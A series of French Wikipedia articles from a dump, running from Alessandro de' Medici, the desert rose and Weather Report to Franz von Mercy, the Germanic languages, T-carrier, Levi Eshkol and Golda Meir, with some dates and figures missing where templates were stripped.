Avec la capitulation de la République florentine et par suite de l'accord conclu entre l'empereur Charles Quint et le pape Clément VII, soutenu par les armées espagnoles, il devient le nouveau maître de Florence.
Après avoir pris le pouvoir, Alexandre commence à rénover les institutions républicaines alors que le traité de reddition de la ville lui imposait de les respecter. Son lointain cousin et successeur, Cosme, les transformera définitivement. Ayant toujours vécu à la cour impériale de Charles Quint, Alexandre en apporte les usages à Florence, notamment celui de s'entourer de lansquenets armés de hallebardes, qui effrayent et déconcertent les Florentins.
Il commence à donner un caractère « princier » à sa gouvernance et élimine les symboles, chers aux Florentins, des institutions communales. Entre autres initiatives, il charge Benvenuto Cellini (qui en parle dans son autobiographie) de préparer, à son effigie, une monnaie de taille différente du florin. Alexandre exige aussi, encore une fois contre tous les traités, la réquisition des armes détenues par les citoyens.
Avec le duché, les institutions florentines connaissent pourtant un semblant de démocratie notamment au travers d'un symbolique « conseil des deux cents » et d'un Sénat (1532) composé de quarante-huit membres nommés à vie.
Alexandre épouse la fille naturelle légitimée de Charles Quint, Marguerite de Habsbourg, le , mais aucun enfant ne naîtra de ce mariage.
Il est assassiné par son cousin Lorenzino de Médicis, le « Lorenzaccio » de Musset, que la rumeur dit amant d'Alexandre. Ils entretenaient en effet une relation peu claire, que certains conseillers jugeaient . Son corps est placé sur celui de son père dans le sarcophage des tombeaux des Médicis de la basilique San Lorenzo de Florence. Cosme, issu de la branche cadette des Médicis, lui succéda.
Descendance.
Les deux premiers enfants sont issus d'une liaison avec Taddea Malaspina.

</doc>
<doc id="249119" url="https://fr.wikipedia.org/wiki?curid=249119" title="Rose des sables (homonymie)">
Rose des sables (homonymie)

La rose des sables est une roche évaporitique.
Ce nom peut également désigner :

</doc>
<doc id="249122" url="https://fr.wikipedia.org/wiki?curid=249122" title="Pibale">
Pibale



</doc>
<doc id="249131" url="https://fr.wikipedia.org/wiki?curid=249131" title="Rose des sables">
Rose des sables

La rose des sables est une roche évaporitique formée par la cristallisation lenticulaire de minéraux solubles, et dont la disposition rappelle les pétales d'une rose. Une rose des sables à environ 10 millions d’années. 
La formation des roses des sables provient de l'évaporation d'eau infiltrée. Ces cristallisations d'origine physico-chimique sont très souvent rencontrées dans les terrains tendres (sable, argile), principalement dans les déserts.
Le principal minéral concerné par ce processus est le gypse ; mais des roses des sables peuvent aussi être composées d'autres minéraux, comme la baryte.
Ces microformes d'accumulation peuvent parfois atteindre de très grandes dimensions et peuvent dépasser la centaine de kilogrammes.

</doc>
<doc id="249132" url="https://fr.wikipedia.org/wiki?curid=249132" title="Baume-les-messieurs">
Baume-les-messieurs



</doc>
<doc id="249133" url="https://fr.wikipedia.org/wiki?curid=249133" title="Großherzogtum Luxemburg">
Großherzogtum Luxemburg



</doc>
<doc id="249139" url="https://fr.wikipedia.org/wiki?curid=249139" title="Messier-Dowty">
Messier-Dowty



</doc>
<doc id="249143" url="https://fr.wikipedia.org/wiki?curid=249143" title="Weather Report">
Weather Report

Weather Report est un groupe américain de jazz fusion, formé en 1971 par le claviériste Joe Zawinul, le saxophoniste Wayne Shorter et le contrebassiste Miroslav Vitouš, et dans lequel joue à partir de 1976 le bassiste Jaco Pastorius. C'est l'un des premiers et des plus influents groupes de jazz fusion
Historique.
Weather Report a été formé à New York en 1971 par le claviériste Joe Zawinul, le saxophoniste Wayne Shorter, ainsi que le bassiste et contrebassiste Miroslav Vitouš. Les deux premiers avaient déjà fait partie de formations avec Miles Davis : Wayne Shorter le premier, au sein du second grand quintet (avec Herbie Hancock, Ron Carter et Tony Williams) à partir de 1964 et Joe Zawinul quant à lui est arrivé sur ses albums plus électriques : "In a Silent Way" (1969) et "Bitches Brew" (1970). Dans Weather Report, ils ont été les deux seuls membres fixes tout au long de l'existence du groupe.
Le succès de la formation doit beaucoup à l'arrivée en 1976 de Jaco Pastorius, alors âgé de 25 ans et déjà célèbre, qui propulsera le groupe à un succès planétaire. Peter Erskine rejoignit le groupe en 1978 à partir de "Heavy Weather", ce qui formera donc la composition la plus connue du grand public. 
À l'origine, le groupe compte parmi ses musiciens Miroslav Vitouš, Airto Moreira et Alphonse Mouzon. De nombreux musiciens ont participé au groupe au fil du temps : Peter Erskine, Alex Acuña, Alphonso Johnson, Victor Bailey, Mino Cinelu, Chester Thompson et même Carlos Santana sur leur dernier album. Le batteur Omar Hakim joue sur l'album "Procession" de 1983, sur lequel il joue aussi la guitare et fait les chœurs.
À la différence de beaucoup de groupes, Weather Report s'est toujours orienté vers une composition d'ensemble, en créant des arrangements complexes, parfois difficiles à différencier des parties improvisées. Chacun des musiciens étant virtuose sur son propre instrument, ils étaient capables aussi bien d'offrir des solos inspirés qu'un gros travail d'accompagnement.

</doc>
<doc id="249144" url="https://fr.wikipedia.org/wiki?curid=249144" title="Tatares">
Tatares



</doc>
<doc id="249145" url="https://fr.wikipedia.org/wiki?curid=249145" title="Tatare">
Tatare



</doc>
<doc id="249148" url="https://fr.wikipedia.org/wiki?curid=249148" title="Pyjama">
Pyjama

Le pyjama (de l'hindoustani پاجامہ / पाजामा "pāy-jāma" dérivé du mot persan پايجامه "pāy-jāme" qui signifie et désigne un pantalon ample) est un vêtement usuel utilisé pour aller dormir. Vêtement de nuit le plus classique (sinon le plus courant, car il semble passer de mode chez l'adulte en occident), il est généralement composé de deux pièces : une veste ou un pull et un pantalon, et est généralement fait d'un tissu doux, comme le pilou ou la flanelle.
Pour les enfants et notamment les bébés, il peut être composé d'une seule pièce appelée aussi grenouillère.
Histoire.
Le pyjama est un vêtement venant des Indes orientales.
Le pyjama s'impose comme vêtement de nuit en Europe et Amérique du Nord, dans les années 1870. Il était porté par l'aristocratie française. À partir de 1918, Coco Chanel porte le « pyjama de plage », qui devient populaire auprès des femmes dans les années 1920 et 1930. Madame Pangon a également dessiné des pyjamas de soirée dès 1921. Avec l'arrivée des Américains en Europe durant la Première Guerre mondiale, le pyjama s'est démocratisé car il s'agit du seul vêtement de nuit qu'ils utilisaient. Le pyjama retrouve de la popularité en 1933 lorsque Marlène Dietrich porta le smoking et autres tenues masculines.

</doc>
<doc id="249150" url="https://fr.wikipedia.org/wiki?curid=249150" title="Franz von Mercy">
Franz von Mercy

Franz von Mercy ou François de Mercy, né vers 1590 à Longwy (Duché de Bar) et mort le à Alerheim (Bavière), est un officier général du Saint-Empire. Generalfeldmarschall au service de la Ligue catholique, il fut Statthalter d'Ingolstadt, et Oberbefehlshaber de l'armée impériale pendant la guerre de Trente Ans.
Biographie.
Mercy est issu d'une famille de la noblesse de Lorraine. Son père s'appelle également François. Il a un frère, Kaspar (Gaspard), officier général au service du duc de Bavière. Son épouse s'appelle Anne-Marguerite. Elle est la fille du bailli de l'Ortenau, Johann Rainer von Schauenburg.
En 1606 il entre au service de l'armée impériale et y monte progressivement dans la hiérarchie. Il participe en 1631 à la bataille de Breitenfeld et combat en 1634 dans le sud-ouest de l'Allemagne. Il défend Breisach contre une attaque menée par les troupes protestantes de Bernard de Saxe-Weimar.
En 1636 il commande les troupes du duc de Lorraine, Charles IV, membre de la coalition regroupant l'Autriche, l'Espagne, la Bavière, le pape, en guerre contre la France de Louis XIII et Richelieu (Guerre de dix ans, commencée le ). Cette armée du duc de Lorraine fait partie des forces coalisées commandées par le général en chef Matthias Gallas. Le , le duc de Lorraine et Franz von Mercy font une entrée triomphale à Dole (en Franche-Comté) qu'une armée française, commandée par le prince de Condé, gouverneur de Bourgogne n'avait pas réussi à prendre quelques semaines auparavant. Une partie de l'armée lorraine, constituée essentiellement de trois mille mercenaires croates se dirige alors sur Pontailler-sur-Saône (ville du duché de Bourgogne). La ville, après une belle résistance, est prise le . La répression infligée par l'armée de Franz von Mercy fut effroyable : tous les habitants capturés furent brûlés vifs, toutes les maisons incendiées, les deux églises rasées. Les forces croato-lorraines s'abattent alors sur les villages voisins de Pontailler : les villages de Maxilly-sur-Saône, Heuilley-sur-Saône (le ), Talmay, Saint-Sauveur, etc., furent complètement détruits, y compris les églises et prieurés. Tous les habitants qui n'avaient pu se cacher au fond des forêts ou dans des îles reculées de la Saône furent passés au fil de l'épée, sans considération de leur sexe ou leur âge. Ce fut un massacre d'une cruauté implacable. Cette armée, dont Franz Mercy était le commandant en chef, se dirigea alors sur Mirebeau-sur-Bèze qui offrit une belle résistance () avant que la jonction de l'armée de Mercy avec le gros des troupes de Gallas ne permette la prise de la ville. Elle fut traitée avec la même violence que les villages du bord de Saône. Les armées impériales de Gallas et Mercy se dirigèrent alors vers le sud en continuant leurs massacres (le prieuré de Saint Léger fut dévasté et tous les habitants tués) jusqu'à la ville de Saint-Jean-de-Losne. Là, les habitants, hommes et femmes, leur opposèrent une farouche et héroïque résistance jusqu'à l'arrivée de renforts français. Le camp des armées impériales ayant été inondé par une crue de la Saône, Gallas et Mercy décidèrent de se replier vers la Comté. La retraite, dans le mauvais temps (du à ), fut très pénible et l'armée impériale y laissa de nombreux canons et de nombreux morts. Il fallut deux générations pour que les villages de Pontailler, Maxilly, Heuilley, Talmay soient reconstruits et retrouvent une vie normale. 
En 1638, Franz von Mercy passe au service de la Bavière. Pendant l'hiver 1640-1641, il s'oppose victorieusement à une attaque des Suédois commandés par Johan Banér. 
Le , les armées réunies de Mercy, de Jean de Werth et de Charles IV de Lorraine battent les Français commandés par Josias Rantzau à la bataille de Tuttlingen. 
En 1644, les armées coalisées de Bavière et du Saint-Empire, respectivement sous les ordres de Mercy et de Jean de Werth, libèrent Überlingen par Charles-Christophe de Mazancourt, et Fribourg-en-Brisgau de l'occupation par les Français et finalement, battu par l'armée française de Condé et Turenne à la bataille de Fribourg. Le , Mercy a encore l'occasion de vaincre les Français à la bataille de Mergentheim. Mais le 3 août, Mercy et Jean de Werth sont en revanche battus par Condé et Turenne à la bataille d'Alerheim. Ce jour-là, Mercy reçoit une balle de mousquet en pleine tête et fait partie des quelque huit mille morts. Enterré près du champ de bataille, on grave sur sa tombe cette épitaphe : "Sta, viator, heroem calcas" (« Arrête-toi voyageur, tu marches sur [les cendres d']un héros »).

</doc>
<doc id="249158" url="https://fr.wikipedia.org/wiki?curid=249158" title="Langues germaniques orientales">
Langues germaniques orientales

Les langues germaniques orientales forment un sous-ensemble des langues germaniques. À la différence des branches occidentale et nordique, toutes les langues germaniques orientales sont mortes. La langue la mieux connue de ce groupe est celle des Goths.

</doc>
<doc id="249159" url="https://fr.wikipedia.org/wiki?curid=249159" title="Langues germaniques occidentales">
Langues germaniques occidentales

Les langues germaniques occidentales (ou rameau westique) forment la plus grande des trois branches de la famille des langues germaniques, incluant notamment l'allemand, l'anglais et le néerlandais, ainsi que l’afrikaans, les langues frisonnes et le yiddish.
Histoire.
Origines et caractéristiques.
La théorie ethnolinguistique ("") d'August Schleicher divise les langues germaniques en trois groupes : les langues germaniques occidentales, orientales et septentrionales. Leurs relations exactes sont difficiles à déterminer du fait, entre autres, des indices épars fournis par les inscriptions runiques ; de plus, demeurant mutuellement intelligibles tout au long des Grandes invasions, certaines variétés individuelles ne sont pas aisées à classer. Les dialectes dont les caractéristiques définissent la branche occidentale sont nés du proto-germanique à la fin de la culture de Jastorf (vers le ). Le groupe germanique occidental est caractérisé par plusieurs innovations phonologiques et morphologiques absentes des autres groupes, telles que :
Cependant, de nombreux linguistes doutent de l’existence d’un ancêtre commun aux langues germaniques occidentales plus récent que le proto-germanique, c’est-à-dire d'un « proto-germanique occidental ». Ainsi, certains pensent qu’après la séparation du groupe oriental, les langues germaniques restantes se sont divisées en quatre dialectes principaux : le germanique septentrional et trois autres groupes, appelés collectivement « germanique occidental » :
Les preuves de cette théorie viennent de plusieurs innovations linguistiques que l'on retrouve à la fois dans les langues germaniques septentrionales et occidentales, dont :
De ce point de vue, selon la théorie des vagues et en contradiction avec la théorie ethnolinguistique (") d'August Schleicher, les propriétés communes des langues germaniques occidentales ne proviennent pas d’un « proto-germanique occidental » originel, mais sont plutôt issues des contacts que les peuples germaniques ont eu entre eux en Europe centrale et desquels les peuples scandinaves ont été privés. Néanmoins, il a été argumenté que, d’après leur syntaxe quasi identique, les langues germaniques occidentales étaient, au début du moins, suffisamment proches pour être mutuellement compréhensibles.
Moyen Âge.
Durant le Moyen Âge, les langues germaniques occidentales se retrouvèrent divisées du fait du développement insulaire du moyen anglais d’une part, et de la seconde mutation consonantique sur le continent d’autre part. La seconde mutation consonantique sépara le haut allemand des autres langues germaniques occidentales. Au début des temps modernes, une grande variété de dialectes existait entre le haut alémanique au sud (le haut-valaisan étant le dialecte germanique vivant le plus méridional) et le bas saxon septentrional au nord. Bien que ces deux extrêmes soient considérés comme des dialectes germaniques, ils ne sont pas mutuellement intelligibles. En effet, au contraire des dialectes du sud, ceux du nord n’ont pas été affectés par la seconde mutation consonantique.
Parmi les variantes de l’allemand moderne, le bas allemand est le plus proche de l’anglais moderne. Le district d’Angeln, qui a donné son nom à l’Angleterre, se situe à l’extrême nord de l’Allemagne, près de la frontière danoise et de la mer Baltique. Au sud de l’Angeln se trouve la région où les Saxons vivaient (aujourd’hui incluse dans le Schleswig-Holstein et la Basse-Saxe). Les Anglo-Saxons, deux tribus germaniques, étaient un mélange de nombreux peuples du nord de l’Allemagne et de la péninsule du Jutland.
Liste et classification.
Les divisions entre sous familles des langues germaniques occidentales sont rarement précisément définies et forment plutôt des continua linguistiques, les dialectes adjacents étant inter-compréhensibles au contraire des dialectes plus distants.
Comparaison.
Le tableau suivante montre les relations qui unissent les principales langues germaniques occidentales (anglais, néerlandais et haut allemand) à l’aide des mots issus des racines proto-germaniques "*se/*þe", "*hwa", et "*he". (Ces racines sont en réalité des simplifications de trois ensembles de racines de formes similaires, partageant la même consonne initiale ou alternant entre deux consonnes dans le cas de "*se/*þe".)

</doc>
<doc id="249173" url="https://fr.wikipedia.org/wiki?curid=249173" title="Warriors, l'impossible mission">
Warriors, l'impossible mission

Warriors, l’impossible mission ("Warriors") est un téléfilm britannique de Peter Kosminsky diffusé en 1999.
Construit à partir des témoignages d'une centaine de Casques bleus britanniques partis en mission en Bosnie, le documentariste anglais Peter Kosminsky tente de répondre à la question "Comment être un soldat de la paix dans un pays en guerre ?".
Le téléfilm se déroule en automne 1992, alors que la guerre fait rage en Bosnie-Herzégovine. De jeunes militaires britanniques sont rappelés de permission pour servir en tant que Casques bleus de la FORPRONU dans le conflit ethnique qui oppose les Croates, Serbes et Bosniaques. À bord de leurs MCV-80 Warrior de couleur blanche à l’effigie de l’ONU, ils sillonnent un pays livré à la barbarie et au chaos.
Ce téléfilm produit par la BBC a été diffusé pour la première fois en France, en deux parties, le sur la chaîne ARTE. La critique lui donne aussitôt la stature d’une œuvre exceptionnelle.
Synopsis.
En , des soldats britanniques profitent d'une permission. À Liverpool, Alan James et son meilleur ami Peter Skeet, en profitent d'abord dans un pub, devant un match de foot, avant de fêter l’anniversaire de la sœur d'Alan puis de sortir en boîte de nuit, le soir. En Écosse, Andre Sochanik, de parents serbo-polonais, assiste à l'enterrement de son jeune frère, tué dans un accident de tracteur à la ferme familiale. Quant au lieutenant Loughrey, il profite de ces instants pour régler les derniers préparatifs de son futur mariage. Mais la permission est subitement annulée et le régiment entièrement rappelé, avec pour mission de rejoindre le conflit des Balkans. 
Sous les ordres des lieutenants Feeley, arrivé d'Irlande, et Loughrey, ces soldats font partie du contingent des Casques bleus de l’ONU qui, quoi qu’il arrive, ne peuvent, en aucune façon, intervenir dans ce conflit ethnique, entre Serbes, Croates et Bosniaques. En plein cœur de la Bosnie, ravagée par la bestialité humaine, ils patrouillent à bord de leurs blindés MCV-80 Warrior (« guerrier »), et vont alors côtoyer l’horreur poussée à son paroxysme. Les Serbes, Croates et Bosniaques détruisent les villages et pillent les maisons, n'hésitant pas à tuer tout ce qui se dresse sur leur passage, hommes, femmes, enfants, nourrissons et vieillards... 
La mort de Skeet, touché par une balle perdue, se devra de rester un dommage collatéral à cause des ordres de non-intervention que ces militaires, formés avant tout à combattre, ont reçus. Le leitmotiv pour tous est de n’apporter de l’aide qu’aux blessés, et à personne d’autre. Tout autre geste pourrait être interprété comme une implication politique, évènement que la haute hiérarchie, au loin, tient évidemment à éviter. Une situation qui ronge littéralement de l’intérieur le lieutenant Feeley, pourtant solide sur le terrain. Et si ce dernier est celui qui dissimule le mieux ses sentiments devant les hommes qu'il doit commander, la colère et le dégoût sont plus exprimés par le lieutenant Loughrey, qui trouvera de la chaleur humaine auprès d’une des interprètes du régiment, afin de ne pas se laisser détruire par ce qui se passe sous ses yeux. Mais, plus les jours passent et plus la frustration de la passivité devient intenable pour ces soldats et leurs officiers. Chaque mort humaine, quelle qu’elle soit, prend tout son sens par son injustice et leur impuissance à riposter. 
De retour chez eux, ils seront tous psychologiquement marqués à jamais.

</doc>
<doc id="249183" url="https://fr.wikipedia.org/wiki?curid=249183" title="Liste des conseillers départementaux des Bouches-du-Rhône">
Liste des conseillers départementaux des Bouches-du-Rhône

Le conseil départemental des Bouches-du-Rhône est composé de 58 conseillers départementaux. Ils ont été élus lors des élections de 2021.

</doc>
<doc id="249191" url="https://fr.wikipedia.org/wiki?curid=249191" title="Reyran (rivière)">
Reyran (rivière)



</doc>
<doc id="249192" url="https://fr.wikipedia.org/wiki?curid=249192" title="Franck">
Franck

Franck peut être considéré comme une variante française du prénom allemand masculin "" ou "Franken". Ce prénom, dont l'origine est assez obscure, pourrait avoir un rapport avec l'adjectif latin "francus" qui qualifiait en latin tardif à la fois l'homme libre, le combattant faisant valoir ses droits et la ligue des Francs. Il ferait partie dès l'origine d'une famille de prénoms, plus tard étendue aux prénoms dérivés , François ou . Aux États-Unis, c'est la forme allemande et non Franck qui est utilisée.

</doc>
<doc id="249194" url="https://fr.wikipedia.org/wiki?curid=249194" title="Levi Eshkol">
Levi Eshkol

Levi Eshkol (en hébreu : לוי אשכול) (né le , mort le ) est un homme d'État, troisième Premier ministre de l'État d'Israël de 1963 jusqu'à sa mort (d'une crise cardiaque) en 1969.
Biographie.
Né en 1895 dans le village d'Orativ à proximité de la ville de Kiev en Ukraine, Levi Eshkol est né d'une mère de culture hassidique et d'un père plutôt proche des "mitnagdim". Levi Eshkol reçoit donc une éducation fortement religieuse. Il immigre en Palestine ottomane en 1914. Il s'engage dès son arrivée dans la Légion juive.
Eshkol est élu à la "Knesset" pour la première fois en 1951, en tant que membre du parti Mapaï. En 1963, il succède à David Ben Gourion au poste de Premier ministre. Son mandat se caractérise par une forte ouverture à l'international, un rapprochement avec l'Allemagne de l'Ouest (premiers contacts diplomatiques en 1965), et des liens culturels forts avec l'URSS.
Durant la guerre des Six Jours, il rassemble un gouvernement d'union nationale, et confie le portefeuille de la Défense à Moshe Dayan.
En Israël, Levi Eshkol est particulièrement connu pour avoir mis en place le système national de distribution de l'eau.
Sheizaf Rafaeli est son petit-fils.

</doc>
<doc id="249197" url="https://fr.wikipedia.org/wiki?curid=249197" title="T-carrier">
T-carrier

En télécommunications, T-carrier est la désignation d'un système générique de télécommunication numérique multiplexé sur lignes fixes, originellement développé par Bell Labs et utilisé en Amérique du Nord et au Japon.
L'unité de base dans le système T-carrier est le DS0 qui a un débit de transmission de , et est couramment utilisé pour un circuit voix.
Le système E-carrier, où « E » signifie Européen, est incompatible et était utilisé partout dans le monde en dehors du Japon, du Canada et des États-Unis.
T1.
Cette technique consiste à multiplexer le débit de plusieurs canaux sur des liens numériques du réseau téléphonique utilisant deux paires de fils.
Grâce à cette technique, il est possible d’atteindre un débit de dans les 2 sens sur deux paires torsadées. Il est possible que le débit puisse tomber à par exemple en fonction de la qualité de la ligne et de la distance de la ligne sur le dernier kilomètre (entre 3 et suivant le diamètre des fils, respectivement entre et ).
Les circuits T2 et T3 transportent plusieurs canaux T1 multiplexés, permettant d'atteindre des débits jusqu’à .
On suppose que le débit de a été choisi empiriquement. Les tests menés par AT&amp;T "Long Lines" à Chicago étaient réalisés sur des circuits enterrés et les parties terminales étaient situées à l'une de l'autre. La vitesse du circuit a donc été augmentée jusqu’à ce que le taux de perte soit inacceptable, puis réduite pour garder une marge.
Explication du T1 de la hiérarchie numérique nord-américaine.
Couramment pour un téléphone, la bande passante dédiée est de à .
Pour chaque bande passante, l'échantillonnage se fait au rythme de 8000 fois par seconde ()
1/8000 de seconde = 
De plus, chaque échantillon pour un signal audio ( à ) est codé sur 8 bits.
Donc, pour un canal de signal audio, le débit sera de :
8000 échantillons/s x 8 bits/échantillon = 
Par conséquent, le T1 est formé de 24 canaux de signaux audios 
Alors, 24 canaux x = 
Il y a 1 bit de trame réservé à la gestion et à la synchronisation toutes les .
Donc, pour arriver à une seconde, il faut faire 8000 fois .
Il faut ajouter au total 8000 bits de gestion et de synchronisation.

</doc>
<doc id="249198" url="https://fr.wikipedia.org/wiki?curid=249198" title="Mapai">
Mapai

Mapai est un nom désignant :

</doc>
<doc id="249201" url="https://fr.wikipedia.org/wiki?curid=249201" title="Golda Meir">
Golda Meir

Golda Meir (en hébreu : גּוֹלְדָּה מֵאִיר, connue aussi sous le nom de Golda Meirson), née Golda Mabovitch à Kiev le et morte à Jérusalem le , est une femme d'État israélienne. Elle participe à la création de l'État d'Israël, a été ministre des Affaires étrangères, ainsi que la quatrième Première ministre d'Israël du au .
En raison de sa fermeté et de ses victoires sur le plan militaire, elle est surnommée la « Dame de fer » avant que ce qualificatif soit repris pour Margaret Thatcher, Première ministre du Royaume-Uni. Pendant sa vie politique, Golda Meir est surnommée « meilleur homme du gouvernement » (par Ben Gourion) et « grand-mère d'Israël » par la presse populaire.
Elle est la première femme Premier ministre en Israël et la troisième femme dans le monde à ce poste (seules Sirimavo Bandaranaike au Sri Lanka et Indira Gandhi en Inde l'ont précédée).
Biographie.
Jeunesse et formation.
Golda Mabovitch naît à Kiev en Ukraine au cœur de l'Empire russe, dans une famille nombreuse juive non pratiquante mais traditionaliste. Elle est le septième des huit enfants de Blume Neiditch et de Moshe Mabovitch (ou Mabowitz), modeste menuisier et ébéniste qui milite dans des cercles sionistes-socialistes clandestins. Fuyant les pogroms et la zone de résidence imposée par le tsar à ses sujets juifs, son père choisit d'émigrer vers les États-Unis en 1903 et de s'installer dans le Wisconsin, à Milwaukee, où sa famille le rejoint en 1906. Elle y reçoit une éducation juive, aide sa mère dans la petite épicerie qu'elle tient dans un des quartiers populaires de la ville, tandis que son père est devenu cheminot.
À l'âge de , alors qu'elle veut poursuivre des études supérieures pour devenir enseignante, elle quitte la maison de ses parents qui souhaitent la marier à un homme plus âgé. Elle rejoint sa sœur Sheyna à Denver (Colorado) et y rencontre Morris Meyerson (nom anglicisé en Meirson), un jeune peintre d'affiches, qu'elle épouse le .
Engagement politique.
Suivant sa sœur qui l'a précédée dans son engagement sioniste, elle commence sa vie militante à 18 ans dans des réunions politiques, au cours desquelles elle prend la parole pour défendre un sionisme socialiste. Elle organise des marches de protestation et rejoint le mouvement marxiste Poale Zion.
Le , son père devient citoyen américain sous le nom de Morris Mabowehz. Elle obtient cette citoyenneté par filiation. Le , Golda, son mari et sa sœur Sheyna font leur alya : ils embarquent à bord du et émigrent vers la Palestine alors sous mandat britannique.
À leur arrivée, ils rejoignent le kibboutz Merhavia et leur vie est faite d'arbres à planter, de cuisine et de travaux de la ferme. Golda commence alors à s'affirmer en tant que . Elle est notamment choisie par son kibboutz comme représentante auprès du syndicat de la (embryon du futur parti travailliste) jusqu'en 1924, date à laquelle son mari et elle-même choisissent de quitter le kibboutz pour déménager à Tel Aviv, puis à Jérusalem. Ils y ont deux enfants : Menahem né en 1924 et Sarah née en 1926.
Lorsque Golda doit retourner avec ses enfants à Tel Aviv en 1928 pour y devenir secrétaire générale des "" (le Conseil ouvrier féminin de la Histadrout), son époux reste seul à Jérusalem jusqu'à sa mort en 1951, le couple étant séparé depuis 1940 mais n'ayant jamais divorcé. Elle gagne progressivement en influence au sein du Comité central de la qui compose une forme de gouvernement de l'ombre, dans l'attente de la création de l'État d'Israël. En 1930, elle est une des fondatrices avec David Ben Gourion du parti Mapaï.
Carrière politique.
En 1938, elle est nommée « observateur juif de Palestine » à la conférence d'Évian, et en 1940 elle devient directrice du département politique de la .
En 1946, le pouvoir britannique arrête de nombreux politiques sionistes de Palestine, mais Golda Meir y échappe et prend alors en charge l'organisation. Elle négocie avec les Britanniques tout en restant en contact avec le mouvement de guérilla.
Le , Golda Meir est parmi les (et une des deux femmes avec Rachel Cohen-Kagan) qui signent la déclaration d'indépendance de l'État d'Israël. Le lendemain, elle reçoit le premier passeport israélien édité pour se rendre aux États-Unis et y collecter des fonds.
À son retour, elle devient la première ambassadrice israélienne en Union soviétique, poste qu'elle quitte en 1949 pour rejoindre la , le parlement israélien, où elle siège jusqu'en 1974.
De 1949 à 1956, elle est ministre du Travail. En 1956, elle devient ministre des Affaires étrangères dans le gouvernement de David Ben Gourion, qui dit d'elle qu'elle est . Il lui fait changer son nom de famille pour un nom hébreu, Meir (abréviation de son nom marital Meirson), qui désigne un « éclat brillant ».
Elle est logée dans l’appartement supérieur de la villa Harun ar Rashid, une villa appartenant à la famille palestinienne de George Bisharat et dévolue au Gardien des propriétés des absents en vertu de la loi sur la propriété des absents. Lors de la visite du secrétaire des Nations unies, Dag Hammarskjöld, elle fait décaper le nom de la maison gravé en arabe sur la façade afin de dissimuler la spoliation.
En 1965, elle quitte le gouvernement, fatiguée par l'exercice de ses responsabilités. Elle est rapidement rappelée aux affaires pour prendre la fonction de secrétaire générale du Parti travailliste pendant huit mois, avant de se retirer à nouveau le .
Première ministre d'Israël.
À la mort soudaine de Levi Eshkol le , le Parti travailliste choisit Golda Meir pour devenir présidente du parti et Première ministre d'Israël.
L'état d'esprit des Israéliens pendant le mandat de Golda Meir est une confiance totale, notamment liée à la victoire écrasante et aux conquêtes de la guerre des Six Jours de 1967. Golda Meir n'a jamais jugé nécessaire de rechercher des compromis avec les Palestiniens. C'est l'époque où elle aurait prononcé des citations dont la véracité sera sérieusement contestée par l'enquête fouillée de Harvey Rachlin dans "The Jewish Press" et le quotidien israélien "Haaretz". On en trouve une première version dans un recueil de citations de Golda Meir datant de 1970 mais les auteurs, Israel et Mary Shenker, ne les ont pas reprises dans leur imposante nécrologie de Golda Meir dans le "New York Times" en avril 1974, contenant pourtant plusieurs dizaines de citations de la défunte.
Une deuxième version, de 1973, se voulant de « l'histoire orale » et profondément réécrite, est encore plus fragile, Nasser, décédé en 1970, étant remplacé par dans les deux phrases et par , tandis que la notion de reproche est durcie pour aller jusqu'au refus de pardonner, approche antinomique avec la notion de paix et fréquente dans les discours militants se référant à un passé déjà relativement éloigné.
Une troisième version, sans source et encore profondément modifiée, est évoquée dans un livre de Jean Daniel en 2008, mais sous la forme seulement du souvenir d'une tierce personne, car précédée de , référence à Nasser qui émane probablement du recueil contesté de 1970, et où devient . D'autres versions encore durcies seront imaginées et contestées, attribuée à Golda Meir sans date précise.
Golda Meir conteste la notion de peuple palestinien en affirmant le :  ; ainsi que le : . Elle exprime son point de vue lors d'un entretien télévisé avec le journaliste Edwin Newman sur NBC News en 1973 : il n'y a jamais eu d'État palestinien, c'est la Société des Nations qui a découpé artificiellement la Syrie en mandat français (Syrie et Liban actuels) et mandat anglais, et les Britanniques, qui découpèrent ensuite leur territoire entre rive droite (Transjordanie) et rive gauche (Palestine) du Jourdain. Selon Golda Meir, les Arabes de Palestine ne diffèrent en aucun point (religieux, culturel, ethnique, historique) des Arabes de Jordanie, la distinction venant du découpage britannique de 1922. L’argument est donc qu'un « peuple palestinien » est une invention politique destinée à contester la souveraineté d'Israël et que leur situation de réfugiés vient de la politique délibérée des États arabes de refuser leur intégration pour les instrumentaliser contre Israël.
Son mandat est marqué par des troubles au sein de la coalition au pouvoir et par un manque de direction. Cela se traduit par la mauvaise utilisation des informations transmises par le , qui permet le succès initial de l'attaque surprise par les armées arabes le jour du en 1973. À l'issue de la guerre du Kippour Golda Meir démissionne le , et Yitzhak Rabin lui succède. Elle prend sa retraite politique et se retire principalement au kibboutz Revivim dans la maison de sa fille Sarah.
Mort.
À l'automne 1978, elle est hospitalisée à l'hôpital Hadassah de Jérusalem, où elle meurt à l'âge de d'un probable lymphome de faible malignité compliqué à la fin de métastases osseuses et hépatiques. Le diagnostic de maladie de Waldenström a été évoqué. Sa disparition donne lieu à plusieurs hommages de personnalités politiques à l'international.
Le , Golda Meir est inhumée dans le carré des « Grands de la nation » du mont Herzl à Jérusalem.
Dans les arts et la culture populaire.
Théâtre.
En 1977, Anne Bancroft joue le rôle de la femme politique dans la pièce "Golda" de William Gibson. En 2003 l'actrice américaine Tovah Feldshuh retrace sa trajectoire politique dans "", seconde pièce de Gibson sur la vie de Meir. Ce est controversé, Gibson y suggérant que Golda Meir aurait envisagé d'utiliser des armes nucléaires pendant la guerre du Kippour, ce qui aurait pu déclencher une Troisième Guerre mondiale.
Filmographie.
Cinéma.
Dans "Golda's Balcony," sorti en 2007, Valerie Harper interprète le rôle de Golda. En 2005 l'actrice Lynn Cohen joue le rôle du Premier ministre dans le film "Munich" de Steven Spielberg. Tovah Feldshuh interprète à nouveau le rôle de Meir dans le film "Ô Jérusalem" d’Élie Chouraqui, adaptation cinématographique du roman éponyme de Dominique Lapierre et Larry Collins.
En 2019 Tovah Feldshuh interprète son rôle dans "Golda's Balcony" réalisé par Scott Schwartz. En 2023 Helen Mirren joue le rôle du Premier ministre dans le biopic "Golda" de .
Télévision.
Documentaire.
En 2019 Sagi Bornstein, Udi Nir et Shani Rozanes réalisent "Golda".
Téléfilm.
En 1986 Colleen Dewhurst joue Golda dans "Vengeance" réalisé par Michael Anderson.
Série.
En 1982 l'actrice australienne Judy Davis joue une jeune Meir dans "Une femme nommée Golda" tandis qu'Ingrid Bergman interprète le personnage adulte.
Honneurs.
Son nom a été donné à plusieurs lieux et bâtiments aux États-Unis ( et à Milwaukee dans le Wisconsin, ' à New York, ' au ) et en Israël ("Golda Meir Boulevard" à Jérusalem, " à Tel Aviv).
